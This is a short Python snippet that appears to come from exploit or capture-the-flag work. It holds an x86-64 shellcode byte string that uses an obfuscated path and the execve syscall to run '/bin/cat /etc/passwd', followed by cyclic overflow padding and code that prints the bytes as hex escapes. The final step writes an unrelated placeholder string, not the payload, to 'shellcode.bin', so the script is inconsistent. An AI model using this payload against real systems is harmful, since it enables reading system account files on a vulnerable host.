byte_string = b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7hsswdH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8\x01.dub.q`H1\x04$H\xb8/bin/catP1\xf6Vj\x11^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05awaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa'

# Convert bytes to hex
hex_string = byte_string.hex()

# Format hex string with \x escaping
formatted_hex_string = ''.join(f'\\x{hex_string[i:i+2]}' for i in range(0, len(hex_string), 2))

print(formatted_hex_string)

# This is my shellcode
shellcode = b'aedkaepodkaed'

# Now write this shellcode as binary to a file
with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)